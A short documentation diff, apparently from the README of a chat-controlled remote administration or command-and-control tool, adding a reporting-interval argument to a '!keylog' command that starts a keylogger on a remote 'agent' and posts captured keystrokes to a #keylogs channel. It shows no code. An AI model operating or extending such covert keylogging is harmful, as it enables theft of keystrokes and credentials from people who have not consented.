@@ -34,9 +34,9 @@
 
     Screenshots will be saved on the **#screenshots** channel.
 
-- **!keylog {AGENT-ID}**
+- **!keylog {AGENT-ID} {REPORT-EVERY}**
 
-    With the !keylog command you initiate the keylogger on the specified agent.
+    With the !keylog command you initiate the keylogger on the specified agent. Make sure you add how often the keylogger will report to you in SECONDS.
 
     Keylogs will be saved on the **#keylogs** channel.
 
